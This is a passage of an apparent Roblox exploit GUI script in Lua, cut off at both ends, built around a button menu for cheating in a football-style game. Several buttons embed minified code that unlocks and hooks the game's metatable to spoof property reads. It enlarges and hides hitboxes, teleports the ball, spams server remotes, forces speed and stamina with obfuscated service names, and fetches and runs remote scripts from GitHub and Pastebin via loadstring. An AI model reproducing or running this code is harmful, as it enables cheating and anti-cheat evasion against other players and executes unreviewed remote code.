		if getgenv().MTAPIMutex~=nil then return end;local function a()if is_protosmasher_caller~=nil then return 0 end;if elysianexecute~=nil then return 1 end;if fullaccess~=nil then return 2 end;if Synapse~=nil then return 3 end;return 4 end;local function b()local c=a()if c==0 then return is_protosmasher_caller end;if c==1 or c==3 then return checkcaller end;if c==2 then return IsLevel7 end;return nil end;if a()==2 then error("mt-api: Exploit not supported")end;local d={}local e={}local f={}local g={}local h={}local i={}local j={}local k={}local function l()local m=a()local n=b()local o=getrawmetatable(game)if m==0 then make_writeable(o)elseif m==2 then fullaccess(o)else setreadonly(o,false)end;local p=o.__index;local q=o.__newindex;local r=o.__namecall;o.__index=newcclosure(function(s,t)if n()then return p(s,t)end;if d[s]and d[s][t]then local u=d[s][t]if u["IsCallback"]==true then return u["Value"](s)else return u["Value"]end end;if g[t]then local v=g[t]if v["IsCallback"]==true then return v["Value"](s)else return v["Value"]end end;if j[s]and j[s][t]then return k[s][t]end;return p(s,t)end)o.__newindex=newcclosure(function(w,x,y)if n()then return q(w,x,y)end;if e[w]and e[w][x]then local z=e[w][x]if z["Callback"]==nil then return else z["Callback"](w,y)return end end;if h[x]then local A=h[x]if A["Callback"]==nil then return else A["Callback"](w,y)return end end;if j[w]and j[w][x]then local B=j[w][x]if type(y)~=B["Type"]then error("bad argument #3 to '"..x.."' ("..B["Type"].." expected, got "..type(x)..")")end;k[w][x]=y;return end;return q(w,x,y)end)local C=isluau and isluau()or false;o.__namecall=newcclosure(function(D,...)local E={...}local F=C and getnamecallmethod()or table.remove(E)if n()then if F=="AddGetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local G=E[1]local H=E[2]local I=E[3]if type(G)~="string"then error("mt-api: Invalid hook type")end;if not d[D]then d[D]={}end;if I==true and type(H)~="function"then error("mt-api: Invalid callback function")end;d[D][G]={Value=H,IsCallback=I}local J=function()d[D][G]=nil end;return{remove=J,Remove=J}end;if F=="AddGlobalGetHook"then local K=E[1]local L=E[2]local M=E[3]if type(K)~="string"then error("mt-api: Invalid hook type")end;if M==true and type(L)~="function"then error("mt-api: Invalid callback function")end;g[K]={Value=L,IsCallback=M}local N=function()g[K]=nil end;return{remove=N,Remove=N}end;if F=="AddSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local O=E[1]local P=E[2]if type(O)~="string"then error("mt-api: Invalid hook type")end;if not e[D]then e[D]={}end;if type(P)=="function"then e[D][O]={Callback=P}else e[D][O]={Callback=nil}end;local Q=function()e[D][O]=nil end;return{remove=Q,Remove=Q}end;if F=="AddGlobalSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local R=E[1]local S=E[2]if type(R)~="string"then error("mt-api: Invalid hook type")end;if type(S)=="function"then h[R]={Callback=S}else h[R]={Callback=nil}end;local T=function()h[R]=nil end;return{remove=T,Remove=T}end;if F=="AddCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local U=E[1]local V=E[2]if type(U)~="string"then error("mt-api: Invalid hook type")end;if type(V)~="function"then error("mt-api: Invalid argument #2 (not function)")end;if not f[D]then f[D]={}end;f[D][U]={Callback=V}local W=function()f[D][U]=nil end;return{remove=W,Remove=W}end;if F=="AddGlobalCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local X=E[1]local Y=E[2]if type(X)~="string"then error("mt-api: Invalid hook type")end;if type(Y)~="function"then error("mt-api: Invalid argument #2 (not function)")end;i[X]={Callback=Y}local Z=function()i[X]=nil end;return{remove=Z,Remove=Z}end;if F=="AddPropertyEmulator"then if#E<1 then error("mt-api: Invalid argument count")end;local _=E[1]if type(_)~="string"then error("mt-api: Invalid hook type")end;local a0=p(D,_)local a1=type(a0)if not j[D]then j[D]={}end;if not k[D]then k[D]={}end;j[D][_]={Type=a1}k[D][_]=p(D,_)local a2=function()j[D][_]=nil;k[D][_]=nil end;return{remove=a2,Remove=a2}end;return r(D,...)end;if f[D]and f[D][F]then local a3=f[D][F]return a3["Callback"](p(D,F),unpack(E))end;if i[F]then local a4=i[F]return a4["Callback"](D,p(D,F),unpack(E))end;return r(D,...)end)if m==0 then make_readonly(o)elseif m==2 then else setreadonly(o,true)end end;l()getgenv().MTAPIMutex=true
	
		game.Players.LocalPlayer.Character["Right Hand"]:AddPropertyEmulator("Size")
		game.Players.LocalPlayer.Character["Left Hand"]:AddPropertyEmulator("Size")
		wait(0.5)
		game.Players.LocalPlayer.Character["Right Arm"].Size = Vector3.new(5,5,5)
		game.Players.LocalPlayer.Character["Left Arm"].Size = Vector3.new(5,5,5)
		game.Players.LocalPlayer.Character["Right Arm"].Transparency = 0.9
		game.Players.LocalPlayer.Character["Left Arm"].Transparency = 0.9
	end)
end
coroutine.wrap(DTNR_fake_script)()
local function ILVXFM_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		local Player = game.Players.LocalPlayer
		local Mouse = Player:GetMouse()
		Mouse.KeyDown:connect(function(catch)
			catch:lower()
			if catch == "f" then
				for i,balls in pairs(game.Workspace:GetDescendants()) do
					if balls.Name == "TPS" then
						balls.Position = Player.Character["HumanoidRootPart"].Position
					end
				end
			end
		end)
	end)
end
coroutine.wrap(ILVXFM_fake_script)()
local function REXTSH_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		if getgenv().MTAPIMutex~=nil then return end;local function a()if is_protosmasher_caller~=nil then return 0 end;if elysianexecute~=nil then return 1 end;if fullaccess~=nil then return 2 end;if Synapse~=nil then return 3 end;return 4 end;local function b()local c=a()if c==0 then return is_protosmasher_caller end;if c==1 or c==3 then return checkcaller end;if c==2 then return IsLevel7 end;return nil end;if a()==2 then error("mt-api: Exploit not supported")end;local d={}local e={}local f={}local g={}local h={}local i={}local j={}local k={}local function l()local m=a()local n=b()local o=getrawmetatable(game)if m==0 then make_writeable(o)elseif m==2 then fullaccess(o)else setreadonly(o,false)end;local p=o.__index;local q=o.__newindex;local r=o.__namecall;o.__index=newcclosure(function(s,t)if n()then return p(s,t)end;if d[s]and d[s][t]then local u=d[s][t]if u["IsCallback"]==true then return u["Value"](s)else return u["Value"]end end;if g[t]then local v=g[t]if v["IsCallback"]==true then return v["Value"](s)else return v["Value"]end end;if j[s]and j[s][t]then return k[s][t]end;return p(s,t)end)o.__newindex=newcclosure(function(w,x,y)if n()then return q(w,x,y)end;if e[w]and e[w][x]then local z=e[w][x]if z["Callback"]==nil then return else z["Callback"](w,y)return end end;if h[x]then local A=h[x]if A["Callback"]==nil then return else A["Callback"](w,y)return end end;if j[w]and j[w][x]then local B=j[w][x]if type(y)~=B["Type"]then error("bad argument #3 to '"..x.."' ("..B["Type"].." expected, got "..type(x)..")")end;k[w][x]=y;return end;return q(w,x,y)end)local C=isluau and isluau()or false;o.__namecall=newcclosure(function(D,...)local E={...}local F=C and getnamecallmethod()or table.remove(E)if n()then if F=="AddGetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local G=E[1]local H=E[2]local I=E[3]if type(G)~="string"then error("mt-api: Invalid hook type")end;if not d[D]then d[D]={}end;if I==true and type(H)~="function"then error("mt-api: Invalid callback function")end;d[D][G]={Value=H,IsCallback=I}local J=function()d[D][G]=nil end;return{remove=J,Remove=J}end;if F=="AddGlobalGetHook"then local K=E[1]local L=E[2]local M=E[3]if type(K)~="string"then error("mt-api: Invalid hook type")end;if M==true and type(L)~="function"then error("mt-api: Invalid callback function")end;g[K]={Value=L,IsCallback=M}local N=function()g[K]=nil end;return{remove=N,Remove=N}end;if F=="AddSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local O=E[1]local P=E[2]if type(O)~="string"then error("mt-api: Invalid hook type")end;if not e[D]then e[D]={}end;if type(P)=="function"then e[D][O]={Callback=P}else e[D][O]={Callback=nil}end;local Q=function()e[D][O]=nil end;return{remove=Q,Remove=Q}end;if F=="AddGlobalSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local R=E[1]local S=E[2]if type(R)~="string"then error("mt-api: Invalid hook type")end;if type(S)=="function"then h[R]={Callback=S}else h[R]={Callback=nil}end;local T=function()h[R]=nil end;return{remove=T,Remove=T}end;if F=="AddCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local U=E[1]local V=E[2]if type(U)~="string"then error("mt-api: Invalid hook type")end;if type(V)~="function"then error("mt-api: Invalid argument #2 (not function)")end;if not f[D]then f[D]={}end;f[D][U]={Callback=V}local W=function()f[D][U]=nil end;return{remove=W,Remove=W}end;if F=="AddGlobalCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local X=E[1]local Y=E[2]if type(X)~="string"then error("mt-api: Invalid hook type")end;if type(Y)~="function"then error("mt-api: Invalid argument #2 (not function)")end;i[X]={Callback=Y}local Z=function()i[X]=nil end;return{remove=Z,Remove=Z}end;if F=="AddPropertyEmulator"then if#E<1 then error("mt-api: Invalid argument count")end;local _=E[1]if type(_)~="string"then error("mt-api: Invalid hook type")end;local a0=p(D,_)local a1=type(a0)if not j[D]then j[D]={}end;if not k[D]then k[D]={}end;j[D][_]={Type=a1}k[D][_]=p(D,_)local a2=function()j[D][_]=nil;k[D][_]=nil end;return{remove=a2,Remove=a2}end;return r(D,...)end;if f[D]and f[D][F]then local a3=f[D][F]return a3["Callback"](p(D,F),unpack(E))end;if i[F]then local a4=i[F]return a4["Callback"](D,p(D,F),unpack(E))end;return r(D,...)end)if m==0 then make_readonly(o)elseif m==2 then else setreadonly(o,true)end end;l()getgenv().MTAPIMutex=true
	
		game.Players.LocalPlayer.Character["Head"]:AddPropertyEmulator("Size")
		wait(0.5)
		game.Players.LocalPlayer.Character["Head"].Size = Vector3.new(5,5,5)
		game.Players.LocalPlayer.Character["Head"].Transparency = 0.9
	end)
end
coroutine.wrap(REXTSH_fake_script)()
local function OAVARHV_fake_script() -- TextButton_5.LocalScript 
	local script = Instance.new('LocalScript', TextButton_5)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		local args = {
			[1] = workspace.TPS,
			[2] = CFrame.new(Vector3.new(104.05304718018, 3.7450363636017, 144.50581359863), Vector3.new(-0, -0, -1)),
			[3] = Vector3.new(20.015998840332, 31.02379989624, 32.967914581299)
		}
	
		game:GetService("ReplicatedStorage").TPBall:FireServer(unpack(args))
	end)
end
coroutine.wrap(OAVARHV_fake_script)()
local function JTYHMX_fake_script() -- TextButton_6.LocalScript 
	local script = Instance.new('LocalScript', TextButton_6)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		local args = {
			[1] = workspace.TPS,
			[2] = CFrame.new(Vector3.new(1014.05304718018, 33.7450363636017, 1444.50581359863), Vector3.new(-0, -0, -1)),
			[3] = Vector3.new(202.015998840332, 311.02379989624, 342.967914581299)
		}
	
		game:GetService("ReplicatedStorage").TPBall:FireServer(unpack(args))
	end)
end
coroutine.wrap(JTYHMX_fake_script)()
local function FRWE_fake_script() -- TextButton_7.LocalScript 
	local script = Instance.new('LocalScript', TextButton_7)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
				for i,balls in pairs(game.Lighting:GetDescendants()) do
					if balls.Name == "TPS" then
						game.ReplicatedStorage.CatchBall:FireServer(balls)
					end
		end
	end)
	
end
coroutine.wrap(FRWE_fake_script)()
local function XVKIRXB_fake_script() -- TextButton_8.LocalScript 
	local script = Instance.new('LocalScript', TextButton_8)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
				for i,balls in pairs(game.Lighting:GetDescendants()) do
			if balls.Name == "TPS" then
				while true do
					wait()
					game.ReplicatedStorage.CatchBall:FireServer(balls)
				end
			end
		end
	end)
	
end
coroutine.wrap(XVKIRXB_fake_script)()
local function IKONX_fake_script() -- TextButton_9.LocalScript 
	local script = Instance.new('LocalScript', TextButton_9)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		for i,balls in pairs(game.Lighting:GetDescendants()) do
			if balls.Name == "TPS" then
				game.ReplicatedStorage.CatchBall:FireServer(balls)
				wait()
				game.ReplicatedStorage.DropBall:FireServer(balls)
				end
			end
	end)
	
end
coroutine.wrap(IKONX_fake_script)()
local function PIEH_fake_script() -- TextButton_10.LocalScript 
	local script = Instance.new('LocalScript', TextButton_10)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		if getgenv().MTAPIMutex~=nil then return end;local function a()if is_protosmasher_caller~=nil then return 0 end;if elysianexecute~=nil then return 1 end;if fullaccess~=nil then return 2 end;if Synapse~=nil then return 3 end;return 4 end;local function b()local c=a()if c==0 then return is_protosmasher_caller end;if c==1 or c==3 then return checkcaller end;if c==2 then return IsLevel7 end;return nil end;if a()==2 then error("mt-api: Exploit not supported")end;local d={}local e={}local f={}local g={}local h={}local i={}local j={}local k={}local function l()local m=a()local n=b()local o=getrawmetatable(game)if m==0 then make_writeable(o)elseif m==2 then fullaccess(o)else setreadonly(o,false)end;local p=o.__index;local q=o.__newindex;local r=o.__namecall;o.__index=newcclosure(function(s,t)if n()then return p(s,t)end;if d[s]and d[s][t]then local u=d[s][t]if u["IsCallback"]==true then return u["Value"](s)else return u["Value"]end end;if g[t]then local v=g[t]if v["IsCallback"]==true then return v["Value"](s)else return v["Value"]end end;if j[s]and j[s][t]then return k[s][t]end;return p(s,t)end)o.__newindex=newcclosure(function(w,x,y)if n()then return q(w,x,y)end;if e[w]and e[w][x]then local z=e[w][x]if z["Callback"]==nil then return else z["Callback"](w,y)return end end;if h[x]then local A=h[x]if A["Callback"]==nil then return else A["Callback"](w,y)return end end;if j[w]and j[w][x]then local B=j[w][x]if type(y)~=B["Type"]then error("bad argument #3 to '"..x.."' ("..B["Type"].." expected, got "..type(x)..")")end;k[w][x]=y;return end;return q(w,x,y)end)local C=isluau and isluau()or false;o.__namecall=newcclosure(function(D,...)local E={...}local F=C and getnamecallmethod()or table.remove(E)if n()then if F=="AddGetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local G=E[1]local H=E[2]local I=E[3]if type(G)~="string"then error("mt-api: Invalid hook type")end;if not d[D]then d[D]={}end;if I==true and type(H)~="function"then error("mt-api: Invalid callback function")end;d[D][G]={Value=H,IsCallback=I}local J=function()d[D][G]=nil end;return{remove=J,Remove=J}end;if F=="AddGlobalGetHook"then local K=E[1]local L=E[2]local M=E[3]if type(K)~="string"then error("mt-api: Invalid hook type")end;if M==true and type(L)~="function"then error("mt-api: Invalid callback function")end;g[K]={Value=L,IsCallback=M}local N=function()g[K]=nil end;return{remove=N,Remove=N}end;if F=="AddSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local O=E[1]local P=E[2]if type(O)~="string"then error("mt-api: Invalid hook type")end;if not e[D]then e[D]={}end;if type(P)=="function"then e[D][O]={Callback=P}else e[D][O]={Callback=nil}end;local Q=function()e[D][O]=nil end;return{remove=Q,Remove=Q}end;if F=="AddGlobalSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local R=E[1]local S=E[2]if type(R)~="string"then error("mt-api: Invalid hook type")end;if type(S)=="function"then h[R]={Callback=S}else h[R]={Callback=nil}end;local T=function()h[R]=nil end;return{remove=T,Remove=T}end;if F=="AddCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local U=E[1]local V=E[2]if type(U)~="string"then error("mt-api: Invalid hook type")end;if type(V)~="function"then error("mt-api: Invalid argument #2 (not function)")end;if not f[D]then f[D]={}end;f[D][U]={Callback=V}local W=function()f[D][U]=nil end;return{remove=W,Remove=W}end;if F=="AddGlobalCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local X=E[1]local Y=E[2]if type(X)~="string"then error("mt-api: Invalid hook type")end;if type(Y)~="function"then error("mt-api: Invalid argument #2 (not function)")end;i[X]={Callback=Y}local Z=function()i[X]=nil end;return{remove=Z,Remove=Z}end;if F=="AddPropertyEmulator"then if#E<1 then error("mt-api: Invalid argument count")end;local _=E[1]if type(_)~="string"then error("mt-api: Invalid hook type")end;local a0=p(D,_)local a1=type(a0)if not j[D]then j[D]={}end;if not k[D]then k[D]={}end;j[D][_]={Type=a1}k[D][_]=p(D,_)local a2=function()j[D][_]=nil;k[D][_]=nil end;return{remove=a2,Remove=a2}end;return r(D,...)end;if f[D]and f[D][F]then local a3=f[D][F]return a3["Callback"](p(D,F),unpack(E))end;if i[F]then local a4=i[F]return a4["Callback"](D,p(D,F),unpack(E))end;return r(D,...)end)if m==0 then make_readonly(o)elseif m==2 then else setreadonly(o,true)end end;l()getgenv().MTAPIMutex=true
	
		game.Players.LocalPlayer.Character["Left Leg"]:AddPropertyEmulator("Size")
		wait(0.5)
		game.Players.LocalPlayer.Character["Left Leg"].Massless = true
		game.Players.LocalPlayer.Character["Left Leg"].Size = Vector3.new (12.3, 2.11, 10.2)
		game.Players.LocalPlayer.Character["Left Leg"].Transparency = 0.9
	end)
	
end
coroutine.wrap(PIEH_fake_script)()
local function TXGR_fake_script() -- TextButton_11.LocalScript 
	local script = Instance.new('LocalScript', TextButton_11)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
	end)
	
end
coroutine.wrap(TXGR_fake_script)()
local function FNFNDRH_fake_script() -- TextButton_12.LocalScript 
	local script = Instance.new('LocalScript', TextButton_12)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		local RunService = game:GetService("RunService")
		RunService.RenderStepped:connect(function()
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 22
		end)
		local e = game:GetService("\82\117\110\83\101\114\118\105\99\101") e.RenderStepped:connect(function() local c = game:GetService("\80\108\97\121\101\114\115").LocalPlayer.PlayerGui.Start.Points.StaminaBar c.Size = UDim2.new(0,200,0,3) c.Name = "" end)
	end)
	
end
coroutine.wrap(FNFNDRH_fake_script)()
local function LVXMBYW_fake_script() -- TextButton_13.LocalScript 
	local script = Instance.new('LocalScript', TextButton_13)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		local RunService = game:GetService("RunService")
		RunService.RenderStepped:connect(function()
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 22
		end)
		local e = game:GetService("\82\117\110\83\101\114\118\105\99\101") e.RenderStepped:connect(function() local c = game:GetService("\80\108\97\121\101\114\115").LocalPlayer.PlayerGui.Start.Points.StaminaBar c.Size = UDim2.new(0,200,0,3) c.Name = "" end)
	end)
	
end
coroutine.wrap(LVXMBYW_fake_script)()
local function LZZTXN_fake_script() -- TextButton_14.LocalScript 
	local script = Instance.new('LocalScript', TextButton_14)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/KNUzQPYS", true))()
	end)
	
end
coroutine.wrap(LZZTXN_fake_script)()
local function EMTKDD_fake_script() -- TextButton_15.LocalScript 
	local script = Instance.new('LocalScript', TextButton_15)
script.Parent.ZIIndex = 10
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = true
		script.Parent.Parent.Parent.Credits.Visible = false
		script.Parent.Parent.Parent.Information.Visible = false
	end)
end
coroutine.wrap(EMTKDD_fake_script)()
local function SBMLZ_fake_script() -- TextButton_16.LocalScript 
	local script = Instance.new('LocalScript', TextButton_16)
script.Parent.ZIIndex = 10

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.Credits.Visible = true
		script.Parent.Parent.Parent.Information.Visible = false
	end)
end
coroutine.wrap(SBMLZ_fake_script)()
local function VWOX_fake_script() -- TextButton_17.LocalScript 
	local script = Instance.new('LocalScript', TextButton_17)
script.Parent.ZIIndex = 10
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.Credits.Visible = false
		script.Parent.Parent.Parent.Information.Visible = true
	end)
end
coroutine.wrap(VWOX_fake_script)()
local function RHGICX_fake_script() -- TextButton_18.LocalScript 
	local script = Instance.new('LocalScript', TextButton_18)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(RHGICX_fake_script)()
local function TEQIBW_fake_script() -- TextButton_19.LocalScript 
	local script = Instance.new('LocalScript', TextButton_19)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
